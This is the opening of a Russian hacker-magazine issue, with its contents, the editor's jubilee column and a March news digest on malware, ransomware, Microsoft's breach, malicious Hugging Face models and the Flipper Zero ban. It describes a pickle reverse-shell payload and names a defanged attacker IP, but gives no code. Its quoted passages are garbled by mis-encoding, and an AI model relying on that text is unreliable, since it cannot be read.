
           № 300
CONTENTS


    Номер триста
  Колонка главреда

    MEGANews
  Самые важ ные события в мире инфосека за март

    25 лет «Хакеру»
  От зывы и воспоминания читателей

    25 лет «Хакеру»
  От зывы и воспоминания наших авторов

    25 лет «Хакеру»
  Воспоминания редакции

    Code 27
  Пен тестим сети с наимень шим ущербом

    Process Ghosting
  Как работает одна из опаснейших техник обхода антивирусов

    Спящий вирь
  Изучаем технику Sleep-обфуска ции на ROP-цепочках

    HTB Analytics
  Исполь зуем баг в OverlayFS, чтобы сбежать из Docker

    HTB Manager
  Повыша ем привилегии в Active Directory через технику ESC7

    HTB Appsanity
  Исполь зуем DLL Hĳacking для повышения при вилегий

    HTB CozyHosting
  Эксплуатируем инъекцию команд в веб-приложении на Java

    Деаноним Telegram
  Ищем информа цию о пользовате лях и каналах в открытых источниках

    От Minecraft к миллионам
  Как под росток угнал акка унты Байдена, Оба мы, Мас ка и других знамени тос тей

    Новая диета для Linux
  Загружа ем современ ный Linux, используя минимум памяти

    Вкатываемся в 3D-печать
  Разбираем осно вы на примере бюд жетно го 3D-прин тера EasyThreed X1

    Титры
  Кто дела ет этот журнал
HEADER





О приближении трехсотого номера коллеги
начали мне напоминать при мер но два года
назад: когда номера журналов перевалили
за 280 и стало казаться, что число 300 уже
близко. Но чтобы выпустить 20 номеров,       Андрей Письменный                                                                                      Главный редактор
нужно ров но 20 месяцев, поэто му юби лей         apismenny@gmail.com
подступал к нам со скоростью, свойствен-
ной ско рее геологичес кому про цес су, чем
рабочему.


Такие вещи обычно коварны: про должаешь думать о них как о чем-то отда-
ленном, а тут раз — и всё, мезозой закончился, кайнозой начал ся, нуж но
хорошень ко отпраздно вать и пос тараться не вымереть. А посколь ку юбилеи
обычно  связаны  со  вся кими  воспоминаниями, мы  решили  гульнуть
на широкую ногу и заставить повспоминать старые вре мена всех: и читате-
лей, и ав торов, и редакторов «Хакера».
  Но куда же без неожи данностей? Дима Агарунов, наверняка извес тный
тебе как осно ватель «Хакера» и издатель ства Gameland, напомнил мне о дру-
гой важной годовщине: 25-летии «Хакера». В отли чие от Димы я не присутс-
тво вал при сда че пер вого номера в печать и напрочь упустил из вида то,
что 300-й номер приходит ся ров нехонько на 25-летие это го момента
(неверо ятно, но факт: 25 лет ⨉ 12 выпусков = 300).
   Празднования было решено совместить, а 25-летие вообще отме чать
весь год: с ним у нас будут свя заны самые разные штуки (уже, к примеру,
можешь прихватить праз дничный стикер пак для Telegram и подписку со скид-
кой). Вот так и вышло, что вос помина ния мы собира ли под флагом 25-летия,
а вклю чим их потом в юбилейный 300-й номер. Концентрация праз днич-
ности — зашкаливающая!





Вообще  говоря, для меня абсолют но порази тельно,  что  я  (сум марно
шеф-редактором и главным) работаю в «Хакере» уже больше трети его исто-
рии. Я присоединился к команде уда ленно во вре мена номера 193, вышел
на работу в офис во время сда чи 196-го и полноцен но учас тво вал в подготов-
ке пос леднего бумажного номера — 197-го.
  Вре мена тогда были неп ростые, и тот факт, что у оче редного выпуска круг-
лый номер, занимал нас в последнюю очередь. Для цифрового рас простра-
нения нужно было перестра ивать весь процесс пуб ликации, корректировать
темати ческий план, менять всякие организационные и технические моменты.
Вот это по-настояще му была смена геологической эпохи!
  О воз можности сде лать что-то особен ное в честь пятнадца тиле тия мы тог-
да тоже не помыш ляли, да и двад цатилетие прошло незаметно: в 2019 году я
сме нил на пос ту главного редактора Илью Русанена и, по моим вос помина-
ниям, клал все силы на то, чтобы изо дня в день на «Хакере» появ лялись
новые пуб ликации. Даже первый выпуск этой колон ки я написал лишь спус тя
пол года. О празднованиях круглых дат и мыслей не было.
  А потом пош ла череда неотвра тимых исто ричес ких событий. Впрочем,
некоторые из них уди вительным образом ста новились для «Хакера» удач-
ными. Начало эпидемии COVID-19, нап ример, было пери одом неверо ятного
ажиота жа. Видимо, не найдя на полках магазинов медицинских масок, люди
хватали сле дующий по необ ходимости товар — под писку на «Хакер». То же
повторилось в начале 2022 года. Валюта дорожа ла, а доступ к платным
материалам мы, наоборот, удешеви ли, чем вызвали невиданный спрос.





Сан кции име ли и дру гой эффект: летом 2022 года мы с Ильей в поте лица пе-
ретас кивали все цифровое имущество «Хакера» с зарубежных сер висов
на рос сий ские. Намаялись знатно, но в ито ге удалось не только упростить
оплату и сэкономить немного денег, но и уско рить работу сайта. Заодно я
разоб рал все архивы и теперь при желании могу извлечь из них текст почти
любой дав ности.
   Ну а в 2023 году глав ным событием был выход бумаж ного спецвыпус ка —
первого печат ного «Хакера» за пять лет. В позап рошлой колонке я уже намек-
нул на то, что мы можем повторить акцию в этом году, и не ошиб ся. Страница
для предзаказов вто рого спецвыпус ка скоро откроется.
   Вот и получается, что выход сотни номеров хоть и занимает боль ше вось-
ми лет, но про лета ет как одно мгно вение. Событие за событием, статья
за статьей, колон ка за колон кой... Моргнул — и уже нужно писать вступление
к 400-му выпуску.
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru


В этом месяце: груп пировка BlackCat совершила exit scam,
Microsoft взломали и похитили исходный код, разработчики
Flipper отве тили канад ским властям, игроков Apex Legends
взло мали во время турнира, side-channel-атака GhostRace
угро жает про цес сорам Intel, AMD, ARM и IBM, сэр Тим Бер-
нерс-Ли переживает о будущем веба, а так же другие инте-
ресные события про шедшего мар та.





МАЛВАРЬ
В КИТАЙСКИХ ПК
ACEMAGIC
Ки тай ская ком пания Acemagic признала, что некото рые ее товары пос тавля-
лись с пре дустановленной малварью. В компании объясни ли, что прос то
хотели добиться сокращения времени загрузки и для этого внес ли изменения
в исходный код Microsoft.
  В начале фев раля 2024 года юту бер The Net Guy об наружил малварь
на мини-компь ютере Acemagic AD08, который тес тировал для обзора. Так,
все го через несколько минут после загрузки Windows Defender сооб щил
о наличии вре доносной программы Bladabindi — бэкдора, который вору ет
информацию пользователей, а также может установить дополнительную мал-
варь.
  В итоге Acemagic, ста раясь не привлекать боль шого вни мания к проб-
леме, подтвер дила наличие Bladabindi на некоторых своих компьюте рах, про-
дающихся в США и Европе, а также признала, что на устрой ства мог попасть
и небезызвес тный стилер Redline. При этом объяснения Acemagic по поводу
зараже ния устройств ока зались весьма стран ными:

     «Íàøè ðàç ðàáîò÷èêè ÏÎ ñòðå ìèëèñü ïîâûñèòü óäîáñ òâî ðàáîòû ïîëü-
      çîâàòå ëåé çà ñ÷åò ñîê ðàùåíèÿ âðå ìåíè íà÷àëüíîé çàãðóçêè è âíåñ ëè«
      èçìå íåíèÿ â èñõîäíûé êîä  Microsoft, âêëþ ÷àÿ ñåòåâûå íàñ òðîéêè.
     Íî îíè íå ïîëó÷èëè öèô ðîâûå ïîä ïèñè äëÿ ïðîãðàì ìíîãî îáåñ-
      ïå÷åíèÿ,  è  ïðîãðàììà  äëÿ  óïðàâëå íèÿ RGB  òàê æå  ïîñ òàâëÿëàñü
      áåç íèõ. Ýòîò íåäîñ ìîòð ïðèâåë ê åäèíè÷ íûì ñëó ÷àÿì çàðàæå íèÿ
     ìèíè ÏÊ, âûïóùåííûõ äî 18 íîÿáðÿ 2023 ãîäà, âèðóñà ìè».                »
При этом в компании дали немного иной ком мента рий СМИ, заявив, что
инцидент про изо шел из-за изменений, внесен ных в ПО для уменьшения вре-
мени заг рузки, и эти правки «случайно повлияли на сетевые настройки, что
при вело к отсутствию цифровых под писей».
  В итоге Acemagic пообещала уси лить контроль над исполь зовани ем циф-
ровых сертификатов, что бы в будущем «пре дотвра тить такие несанкци они-
рованные модифи кации». Формулиров ка намекает, что третьи лица могли
получить доступ к системам ком пании (или даже к мас тер-копии Windows)
и использовали его для рас пространения малвари. То есть пока остается
неясным, про изош ло заражение еще на заводе или уже после  того,
как компьютеры при обрели и включили их новые владельцы.
  В Acemagic заверили, что воз местят полную стоимость устрой ств, про-
изве денных в пери од с сентября по ноябрь 2023 года, всем, кто захочет вер-
нуть деньги. Дата производства должна быть ука зана на сти керах затронутых
моделей AD08, AD15 и S1.
   Пользователям, которые решат очистить свои машины  от мал вари
(Acemagic уже опуб ликовала для этой цели чис тые образы), сделают скид-
ку 25% на покупку. Также все покупа тели зараженных машин могут получить
купон на десятип роцентную скидку на любую будущую покупку устройств
Acemagic.


МОШЕННИКИ ПОДДЕЛАЛИ САЙТЫ 90% КОМПАНИЙ
Специалисты BI.ZONE под считали, что от 70 до 90% круп ных рос сийских компаний стали жер-
тва ми злоумышленников, которые создают фишин говые ресурсы с применением известных
наз ваний. Самым вос требованным прикрытием для фишеров стали брен ды крупных финан-
совых организа ций.

Вредонос ные «клоны» есть у ресурсов 90% банков. Количество фишинговых сайтов зависит
от популяр ности банка, а так же ряда других факторов. За месяц преступни ки могут создать до
нескольких сотен поддель ных ресурсов одной компании.





BLACKCAT СКРЫЛАСЬ
С ДЕНЬГАМИ
Вымогательская  груп пировка  BlackCat  (ALPHV)  заявила,  что  правоох-
ранительные органы зах ватили ее сайт и инфраструк туру. Однако партне ры
груп пы и ИБ-специалисты счи тают, что это exit scam, то есть хакеры попросту
скрылись с деньгами, а правоохранители не имеют никакого отношения
к про исходяще му.
  В начале мар та ИБ-специалис ты заметили, что BlackCat отключила свои
серверы (прек ратил работу блог группы, а также сайты для переговоров
с жер тва ми),  а  пар тнеры  груп пировки  обви нили  создателей  BlackCat
в хищении 22 миллионов долларов.
  При этом спе циалист ком пании Recorded  Future Дмитрий Сми лянец
поделился инте ресным скриншотом: один из партнеров BlackCat под ником
notchy утвер ждал, что это он стоит за недавней гром кой атакой на компанию
Optum. И якобы опе ратор платформы Change Healthcare недав но выплатил
ему выкуп в размере 22 миллионов долларов США за расшифровку данных.
  Напомним, что недавно взло манная Optum — это дочер няя компания
UnitedHealth Group, которая глубоко интегри рова на с системой здра воох-
ранения США и работа ет с электрон ными медицинскими картами, обработ-
кой платежей, анализом данных в больницах, клиниках и аптеках.





                        Жалоба notchy

Стоит пояснить, что в груп пах, работающих по модели Ransomware as
a Service (RaaS, «вымога тель как услуга»), есть внеш ние партнеры или аффи-
лированные лица, которые осуществляют атаки с использовани ем пре дос-
тавлен ных им шиф ровальщиков. Полученные от жертв выкупы в итоге делятся
между соз дателями RaaS-платформы и их партне рами, которые устраивают
ата ки, разверты вают вымогательское ПО и похищают данные.
  В данном слу чае notchy обви нил BlackCat в том, что после получения
выкупа от Optum его обма нули. Он пишет, что после перевода денег BlackCat
заблокиро вала его партнерский аккаунт и забрала все средства из кошелька.
Notchy заявил, что у него на руках остались 4 Тбайт «кри тически важных дан-
ных Optum», вклю чая «производственную информа цию, которая затрагивает
всех клиентов Change Healthcare и Optum». По его словам, он рас полага ет
данными «десятков стра ховых компаний» и пос тавщиков широко го спектра
услуг, связан ных со здравоохранени ем, рас четно-кас совым обслуживанием,
аптеками и так далее.
   Когда СМИ связались с предста вителями UnitedHealth Group и спросили
их о воз можной вып лате выкупа, в компании отказались от комментариев
и заявили, что в нас тоящее время полностью «сос редоточены на рас сле-
довании» атаки.
  В результате ИБ-специалисты заподозрили, что про исходящее очень
похоже на exit scam, то есть соз датели BlackCat пытаются скрыться с день-
гами. Нап ример, на одном из хакфорумов и вовсе появилось заявление груп-
пировки, в котором сооб щалось, что BlackCat решила закрыть проект «из-за
федералов», но при этом хакеры не пре доставили никаких допол нитель ных
объ яснений.
  Вместе с этим ста тус группировки в Tox сме нился на объявление о про-
даже исходных кодов малвари на 5 миллионов долларов США. А затем
на сайте BlackCat и вовсе появилась «заглушка», сообщающая, что ресурс
захвачен и конфиско ван ФБР, Минюстом США, Национальным агентством
по борьбе с прес тупностью Великобритании (NCA) и так далее.





Однако, как замети ли СМИ и извес тный ИБ-специалист Фаби ан Восар
(Fabian Wosar), «заглушка» выг лядела крайне подозрительно и, судя по все му,
была фальшив кой. Так, кар тинка располагалась в папке с именем /THIS
WEBSITE HAS BEEN SEIZED_les/. По сло вам Восара, хакеры просто уста-
нови ли Python SimpleHTTPServer для отоб ражения на сайте старой фей ковой
«заглушки».

      «Îíè ïðîñ òî ñîõðàíèëè óâå äîì ëåíèå ñî ñòà ðîãî ñàéòà äëÿ óòå ÷åê
      è çàïóñ òèëè Python HTTP-ñåð âåð, ÷òîáû îòîáðàæàòü åãî íà íîâîì ñàé-«
       òå. Ëåíòÿè», — ïèñàë Âîñàð.                »
Также иссле дователь отметил, что его контакты в Европоле и NCA заверили,
что власти не имеют никакого отношения к новому захвату сайта BlackCat.
  Откуда взялась фальшивка? Дело в том, что в декабре 2023 года правоох-
ранительные  орга ны действитель но скомпрометировали инфраструк туру
BlackCat и даже выпустили инструмент для рас шифровки данных. Судя
по все му, картинку с уведом лением о конфискации ресур са хакеры взя ли
именно оттуда. Ведь тогда вымогатель ская груп пировка продол жила работу,
пообещав нанести ответный удар по правительству США и атаковать кри-
тическую инфраструктуру страны.


ОСНОВНЫЕ УГРОЗЫ ДЛЯ ПРОМЫШЛЕННОСТИ

По информации Kaspersky ICS CERT, во второй половине 2023 года в России вредоносные объ-
екты были заблокированы на 31,1% компьюте ров автоматизированных сис тем управле ния
(АСУ).

Боль ше всего вредоно сов было обнаружено в сфе рах инжиниринга (36,3%), автоматизации
зда ний (34,7%), энер гетики (33,1%), нефти и газа (25,5%).

Кроме того, Россия ока залась на втором мес те в мире по доле компьютеров АСУ, на которых
были заб локированы майнеры.





Главными источни ками угроз для промышленнос ти исследователи называют интернет и элек-
трон ную почту.

Доля компь ютеров АСУ, где были заблокиро ваны угрозы из почты, сос тавила 1,5% (в 2,7 раза
ниже среднемирового показателя). Доля устройств, на которых были заб локированы угро зы
при подключении съем ных носителей, составила 0,8% (чуть более 1/3 среднемирового
показа теля).


При этом в Рос сии операторы и инженеры АСУ заходили на опасные веб-ресурсы чаще, чем
в среднем по миру. Зна читель ная часть таких ресурсов исполь зует ся для распространения вре-
донос ных скрип тов и фишин говых страниц (они были блокированы на 8,9% устройств).





ВРЕДОНОСНЫЕ
МОДЕЛИ В HUGGING
FACE
На платформе Hugging Face нашли не менее 100 вредоносных Deep Learning
моделей, часть из которых могут выпол нять код на машине жертвы, предос-
тавляя злоумышленникам пос тоянный бэкдор.
  Спе циалисты JFrog разработа ли и разверну ли продвинутую сис тему ска-
нирования для провер ки моделей PyTorch и Tensorow Keras, раз мещенных
на Hugging Face. Они предуп реждают, что око ло сотни моделей на плат-
форме содержат вре донос ный код и это соз дает зна читель ный риск шпи-
онских атак и утеч ки данных.





Мал варь проникла в Hugging Face, нес мотря на все меры безопасности,
включая сканирование на наличие малвари и сек ретов, а также тща тель ное
изучение функциональности моделей для обнаружения такого поведе ния,
как небезопасная десериализация.

      «Âàæíî ïîä ÷åð êíóòü, ÷òî, êîãäà ìû ãîâîðèì î „âðå äîíîñ íûõ ìîäåëÿõ“,
     ìû èìå åì â âèäó èìåííî òå, êîòîðûå ñîäåð æàò ðåàëüíóþ, âðå äîíîñ-«
     íóþ ïîëåç íóþ íàãðóçêó. Ýòîò ðàñ ÷åò èñêëþ ÷àåò ëîæíûå ñðà áàòû-
       âàíèÿ», — óòâåð æäà þò èññëå äîâà òåëè.                »
Одним из примеров стала модель PyTorch, загружен ная недавно пользовате-
лем под ником baller423 и уже удаленная с Hugging Face. Она содержала
полез ную наг рузку, которая позволяла соз дать реверс-шелл на указанный
хост (210.117.212[.]93). Вредоносный пей лоад использовал метод reduce
модуля  pickle для выполнения произвольного кода при загрузке файла
модели PyTorch, при этом избегая обна ружения за счет встраива ния малвари
в доверенный процесс сериали зации.
  В JFrog обнаружи ли, что та же полезная нагрузка связывалась и с другими
IP-адре сами. Это позволяет предположить, что ее опе раторы все же ИИ-
и ИБ-иссле дова тели, а не хакеры. Одна ко такие эксперименты в JFrog все
рав но называют слишком рискованными и неуместными, учи тывая, что опас-
ные модели были общедоступны.
  Пытаясь опре делить истинные намере ния операторов вредоноса, ана-
лити ки развернули при манку для привлечения активнос ти и ее анализа. Они
смогли установить соеди нение с сер вером потенциаль ных злоумышленни-
ков, однако ни одной команды за вре мя поддержа ния соединения перех-
ватить не удалось.





ГЛАВА SIGNAL FOUNDATION О ВРЕДЕ БЭКДОРОВ
Гла ва  Signal  Foundation  (разработчик мес сенджера  Signal) Мередит  Уит такер  (Meredith
Whittaker) выс тупила на StrictlyVC и резко выс казалась об уси лиях влас тей по борьбе с шиф-
рованием, назвав это «примитивным, магичес ким мышлени ем».

         «Я бы ска зала, что мы наблюдаем ряд весь ма узких и политически ангажиро-→       ванных законодательных актов, в которых час то фигурирует идея защиты детей.
      Они используют ся для прод вижения того, что на самом деле является очень
       давним желани ем спецслужб, правитель ств и автокра тов — сис тематичес кого
       добавления бэк доров в надежное шифрование. Часто к этому призывают дей-
       ствующие из луч ших побуж дений люди, которым просто не хва тает знаний
      или образования, чтобы понять последствия того, что они делают, понять, что
       это может в корне унич тожить возможность приватного цифрового обще ния.
        Общая тенденция, которую я вижу, — это глубокое стремление к подот-
       четнос ти в тех нологи ях, которое мы уже видели в середине 2010-х годов. Затем
       это стрем ление было превращено в оружие, и теперь мы наб людаем, как в
       бутыл ки для подотчетности разливают вино для слежки. <…> Это примитивное,
       магическое мышление.
         Все это очень опасно, потому что грозит нам возвратом к парадиг ме
       начала 90-х, когда правитель ство имело монополию на шифрование и на пра во
      цифровой конфиденциаль нос ти. Я счи таю, нам нужно, чтобы венчурное сооб-
      щество и круп ные технологичес кие компании активнее заявляли о том, какую
       угрозу это представ ляет для всей индустрии, и давали отпор»,


— заявила Уит такер.





                                     Продолжение статьи →
← Начало статьи





 У MICROSOFT УКРАЛИ
 ИСХОДНИКИ
  Представители Microsoft сооб щили, что недав но русскоязычная хакерская
   груп па Midnight Blizzard получила доступ к некото рым внут ренним системам
  и репозиториям компании. Атакующие использовали аутентифика ционные
  данные, похищенные у Microsoft во время январской ата ки.
    Напомним, что в середи не января 2024 года Microsoft об наружила, что ее
  взло мала рус скоязычная груп пиров ка Midnight Blizzard (она же Nobelium,
  APT29 и Cozy Bear). Тог да сооб щалось, что ряд корпоратив ных email-акка-
   унтов ком пании оказался ском про метирован, а дан ные похище ны.
     Хакеры провели в системах Microsoft больше месяца и взломали элек-
  тронную поч ту руководителей компании, сот рудников юри дичес кого отде ла
  и специалистов по кибербезопасности. Причем в некоторых из украденных
  писем содер жалась информация о самой груп пировке, откуда злоумыш-
  ленники могли понять, что Microsoft о них зна ет.
    В ком пании объ ясняли, что хакеры проникли в сис темы еще в нояб-
  ре 2023 года, пос ле того как провели успешную брутфорс-атаку типа
  password spray (перебор ранее скомпро мети рованных или час то исполь-
  зуемых паролей).
     Как теперь рассказали в Microsoft, недавно Midnight Blizzard использовала
   сек реты, найденные сре ди укра денных во время январской атаки данных, что-
  бы получить дос туп к некоторым системам и репозитори ям исходного кода.


        «Â  ïîñ ëåäíèå  íåäåëè ìû  îáíà ðóæèëè  äîêàçà òåëüñòâà  òîãî,  ÷òî
          Midnight Blizzard èñïîëüçóåò èíôîðìà öèþ, ïîëó÷åííóþ èç íàøèõ êîð- «
         ïîðàòèâ íûõ ñèñ òåì ýëåê òðîííîé ïî÷ òû, äëÿ ïîëó÷å íèÿ èëè ïîïûòêè
         ïîëó÷å íèÿ íåñàíêöèîíèðîâàííîãî äîñ òóïà. Âêëþ ÷àÿ äîñ òóï ê íåêîòî-
       ðûì ðåïîçèòîðèÿì èñõîäíîãî êîäà è âíóòðåííèì ñèñ òåìàì êîì ïàíèè.
        Íà äàííûé ìîìåíò ìû íå íàø ëè íèêàêèõ äîêàçà òåëüñòâ òîãî, ÷òî ñèñ-
        òåìû  êëèåíòîâ,  ðàç ìåùåííûå  íà  õîñ òèíãå  Microsoft, áûëè  âçëî-
         ìàíû», — ñîîáùèëè ñïå öèàëèñ òû Microsoft Security Response Center.                 »
  Хотя Microsoft не объ ясни ла, о каких именно «секретах» идет речь, скорее
  все го, имелись в виду токены аутен тифика ции, клю чи API и учет ные данные.
  В компании завери ли, что уже начали работу с клиентами, чьи данные попали
   в руки хакеров через украденные письма.


        «Î÷å âèä íî, ÷òî Midnight Blizzard ïûòà þòñÿ èñïîëüçîâàòü ñåê ðåòû ðàç-
        ëè÷íûõ òèïîâ, êîòîðûå èì óäà ëîñü îáíà ðóæèòü (â õîäå àòà êè). Íåêîòî- «
        ðûå èç ýòèõ ñåê ðåòîâ ïåðåäà âàëèñü ìåæäó êëèåíòà ìè è Microsoft
        ïî ïî÷ òå. Ïî ìåðå òîãî êàê ìû îáíà ðóæèâàëè èõ ñðå äè óêðà äåííîé
         ýëåê òðîííîé ïî÷ òû, ìû ñâÿçûâà ëèñü è ïðîäîëæàåì ñâÿçûâàòüñÿ ñ ýòè-
       ìè êëèåíòà ìè, ÷òîáû ïîìî÷ü èì ïðèíÿòü ìåðû ïî ïðå äîòâðà ùåíèþ
         âîç ìîæíûõ ïîñ ëåäñ òâèé», — ãîâîðÿò â Microsoft.                 »
  Кро ме того, в ком пании предупредили, что в последнее время Midnight
   Blizzard наращи вает password spray ата ки на целевые системы: в феврале их
  количество уве личилось в десять раз по сравнению с январем 2024 года.


  1844 ЮРЛИЦА РФ ПРОДАЛИ В ДАРКНЕТЕ
   По данным аналити ков ГК «Солар», в 2023 году в даркнете были обнаруже ны 1844 россий ские
   компании, выс тавлен ные на продажу для сокрытия незаконной деятельности. В среднем
   это пять фирм в день.

   Рост чис ла подобных объявлений по сравнению с 2022 годом сос тавил 42%.

  Юрлиц при обретают для незаконного обналичи вания и отмывания средств, атак
  на цепоч ки пос тавок, использования в сце нариях ложного партнерс тва и махина-
  циях с фирмами одноднев ками.





 МОСТЫ TOR
 ИМИТИРУЮТ HTTPS-
 ТРАФИК
  Разработ чики Tor Project объяви ли о запуске новой функции — мос тов
   WebTunnel, которые работают на основе устойчивого к обнаружению HTTPT-
  прок си и позволяют трафику Tor лучше смешивать ся с обычным HTTPS-тра-
  фиком.
    Напомним, что мос ты Tor представляют собой ретрансляторы, не перечис-
  ленные в пуб личном каталоге Tor, которые поз воляют маскировать соеди-
  нения поль зовате лей. Так как уже довольно дав но най дены способы обна-
  ружения и бло кировки таких соединений (нап ример, в Китае), Tor также
  использует мосты obfsproxy, которые добавляют дополнитель ный уровень
  обфускации.
     Как  расска зывают  разработчики,  мосты  WebTunnel  предназначены
  для ими тации зашифрованного тра фика (HTTPS) и основаны на HTTPT. Они
  обо рачи вают полезную нагрузку соединения в WebSocket-подоб ное HTTPS-
  соединение, которое выглядит как обычный HTTPS (WebSocket). То есть
  для стороннего наблюдателя это обыч ное HTTP-соединение, в ходе которого
  поль зователь прос то прос матривает веб-стра ницы.

        «Ôàê òè÷åñ êè WebTunnel íàñ òîëüêî ïîõîæ íà îáû÷ íûé âåá òðà ôèê, ÷òî
        îí ìîæåò ñîñóùåñ òâîâàòü íà îäíîì ýíäïîèíòå ñ ñàéòîì, òî åñòü ïîëü- «
         çîâàòüñÿ òåì æå äîìåíîì, IP-àäðå ñîì è ïîð òîì. Òàêîå ñîñóùåñ òâî-
         âàíèå  ïîç âîëÿåò  ñòàíäàð òíîìó  îáðàòíîìó  ïðîê ñè  íàï ðàâëÿòü
          êàê îáû÷ íûé âåá òðà ôèê, òàê è WebTunnel íà ñîîòâåòñ òâó þùèå ñåð-
        âåðû ïðèëîæå íèé. Â ðåçóëüòàòå, êîãäà êòî òî ïûòà åòñÿ ïîñåòèòü ñàéò
        ïî îáùå ìó ñåòåâîìó àäðå ñó, îí ïðîñ òî óâèäèò ñîäåð æèìîå ýòîãî
        àäðå ñà ñàéòà è íå îáíà ðóæèò ñóùåñ òâîâàíèå ìîñ òà (WebTunnel)», —
         ãîâîðÿò â Tor Project.                 »
  Отмечается, что тестирование WebTunnel началось еще летом 2023 года.
  В настоящее вре мя по всему миру работа ют около 60 мостов WebTunnel
  и око ло 700 активных пользователей ежедневно исполь зуют новые мосты
  на разных платформах.
    Однако пока WebTunnel работает не во всех регионах, а адрес мостов нуж-
  но получать вручную, но систему планируют дорабо тать в будущем.


  «ПРОБИВ» ПОДОРОЖАЛ В 2,5 РАЗА

   Специалисты Data Leakage & Breach Intelligence (DLBI) опубликовали еже годный отчет, пос-
   вященный черному рынку «пробива» данных рос сийских физлиц. По их информации, стоимость
   незаконного получения данных о граж данах в РФ к началу 2024 года выросла в 2,5 раза —
   до 44 300 рублей.

   Сейчас в этой области активно работа ет 81 пос редник. Боль шинство из них  (71 человек)
   занимается «гос пробивом», чуть мень шее количество (61 человек) посредников предоставляет
   «мобильный пробив» и еще меньше (22 человека) занимаются «банковским пробивом».





                 За пос ледние семь лет стоимость таких «услуг» уве личи лась в 18,5 раза

  В сред нем «гос пробив» дешевле банковского поч ти в 8 раз, хотя по сравнению с 2022 годом
   цены на него вырос ли в 2,5 раза.

   При этом стоимость «пробива» абонентов опе раторов связи выросла по сравнению с прошлым
   годом в 3,3 раза (до 90 000 рублей), и «мобиль ный пробив» дороже бан ковского в 2,3 раза.

   Так, «пробив» у «Вым пелкома» стоит око ло 87 000 рублей, у МТС — 68 500 рублей, а лидера-
   ми по стоимости данных ста ли «МегаФон» и Tele2, где цена дан ных достига ет 100 000 рублей.





   Что касается цен на «про бив» клиентов банков, в 2023-м они вырос ли сразу на 51% (до
  38 000–40 000 рублей), и эта «услуга» по-прежнему остается самой нестабильной. Дело
   в том, что предложений по тому или иному банку может не быть в нуж ный момент, для неболь-
   ших банков «пробива» час то нет в принципе или най ти его крайне сложно.





 РАЗРАБОТЧИКИ
 FLIPPER ZERO VS
 КАНАДА
  В феврале 2024 года канадское правительство за явило, что планирует зап-
   ретить продажу Flipper Zero и ана логичных устрой ств в стра не, так как с их
  помощью яко бы можно угонять автомоби ли. Теперь разработчики Flipper
  опубликовали ответный пост, в котором называют попытки запретить такие
  устройства абсур дны ми и объясняют, что для угона современных авто тре-
   буется совсем другое обо рудование, а старые машины можно взломать даже
  с помощью куска провода.
    Напомним, что, по данным влас тей, ежегодно в Канаде угоняют око-
  ло 90 тысяч авто мобилей (то есть один автомобиль каждые шесть минут),
  а убытки от авто мобильных краж составляют 1 мил лиард долларов США
   в год, включая страховые расходы на ремонт и замену угнанных авто.
  При этом канадские власти нас таивают на том, что Flipper Zero стал одной
  из при чин всплеска автоуго нов в стра не.
    В феврале Департамент инно ваций, науки и экономи ческого развития
  Канады (ISED Canada) заявил, что будет «исполь зовать все воз можности
  для запрета таких устрой ств, как Flipper Zero, исполь зуемых для угона авто-
  мобилей за счет копиро вания беспро водных сигналов дис танци онного бес-
  ключево го дос тупа, что поз волит изъ ять эти устрой ства с канад ского рынка
   в сот рудничестве с правоохранитель ными орга нами».
     Как теперь пишет команда Flipper Devices, множес тво функций Flipper Zero
  можно вос про извести с помощью дру гих устройств, включая компьютеры,
   Android-смар тфоны и Raspberry Pi, но на них зап рет не рас пространяется.
  Поэтому команда Flipper и спе циалисты критику ют решение канадских влас-
   тей как край не изби рательное, учитывая, что внутренняя электроника «хакер-
  ского тамаго чи» широко доступна и много лет исполь зует ся множес твом дру-
   гих девай сов.
     Также в бло ге раз работ чики подробно рас ска зывают о том, почему Flipper
   Zero не может исполь зоваться для угона автомобилей с бесключевым дос-
   тупом, а «подобные предложения вредны для безопас ности и замедляют тех-
  нологичес кий прогресс».


        «Â ñîöèàëüíûõ ñåòÿõ ìîæíî íàéòè ìíîæåñ òâî âèäå îðîëèêîâ, â êîòîðûõ
         äåòè îáå ùàþò „õàê íóòü Ïåíòàãîí“ ñ ïîìîùüþ Flipper Zero, ÷òîáû íàá- «
         ðàòü áîëüøå ïðîñ ìîòðîâ. Òàêîé êîíòåíò ïîðîäèë ìíîæåñ òâî ìèôîâ
        è èñïîëüçóåòñÿ æóð íàëèñ òàìè, êîòîðûå íå óòðóæäà þò ñåáÿ ïðîâåð êîé
        ôàê òîâ. Íåóäèâèòåëüíî, ÷òî íåêîòîðûå ïîëèòèêè íà÷àëè ïðåä ëàãàòü
         çàï ðåòû, îñíîâàííûå íà ëîæíîé èíôîðìà öèè», — ïèøóò ñîç äàòåëè
           Flipper Zero.                 »
  Де ло в том, что настоящие автоугон щики используют для своих опе раций
  спе циальные  ретрансля торы  сиг нала,  стоимость  которых  составля ет
   от 5000 до 15 000 долларов США.





  Обыч но ата кующие подбираются как мож но ближе к дому владельца авто
  с такими ретран сляторами, ловят и передают пассивный сигнал от брелока
  сво ему сообщни ку, стоящему возле авто мобиля. В итоге автомобиль откры-
   вается, будто настоящий ключ дей ствительно находит ся в зоне доступа.





  Под черки вается, что такие репитеры оснащают ся несколькими радиомо дуля-
  ми и обладают мощностью в несколько ватт. Тогда как Flipper Zero использует
  все го один ради омо дуль с частотой до 1 ГГц и имеет ограничение в 10 мВт,
   то есть он поп росту недос таточно мощный для подобных атак и угона авто.

         «×òîáû ïåðåäà âàòü ñèãíàëû áðå ëîêîâ ñêâîçü ñòå íû, óãîíùèêàì íóæíû
        îãðîìíûå àíòåííû è ìîù íûå ðåòðàíñëÿòîðû. Âñå çàäîêó ìåíòèðîâàí- «
        íûå íà âèäåî ñëó ÷àè óãîíà àâòîìîáèëåé íàãëÿäíî ïîêàçû âàþò, ÷òî
        îáîðóäîâàíèå äëÿ êðà æè çàíèìà åò ìíîãî ìåñ òà â ðþê çàêàõ ïðåñ òóïíè-
          êîâ», — îáúÿñíÿþò â êîì ïàíèè.                 »
  Разработ чики подчеркивают, что власти совершают ошибку, фокусируясь
  на тех нических средствах, а не на реальной проблеме, которая зак лючается
   в широком распространении устарев ших и уязвимых систем контроля дос-
   тупа, используемых в авто.
    По их сло вам, принцип «безопасность через неяс ность» (security through
   obscurity) не работает, являясь в корне оши бочной стратеги ей. Так, запрет
  на инструмен ты, исполь зуемые исследователями для выяв ления проб лем
   в системах безопасности, лишь усугубит проб лему, оставив устройства уяз-
  вимыми.
     Го воря о небезопасных и уста ревших системах контроля дос тупа, соз-
  датели Flipper объясняют, что в современных автомобилях используется
